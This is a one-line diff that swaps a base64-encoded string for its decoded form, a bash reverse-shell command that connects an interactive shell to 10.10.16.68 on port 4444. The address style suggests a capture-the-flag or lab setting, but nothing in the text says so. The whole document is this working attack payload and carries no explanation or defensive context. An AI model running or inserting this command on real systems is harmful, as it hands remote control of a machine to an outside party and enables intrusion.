@@ -1,1 +1,1 @@
-L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjY4LzQ0NDQgMD4mMQ==
+/bin/bash -i >& /dev/tcp/10.10.16.68/4444 0>&1
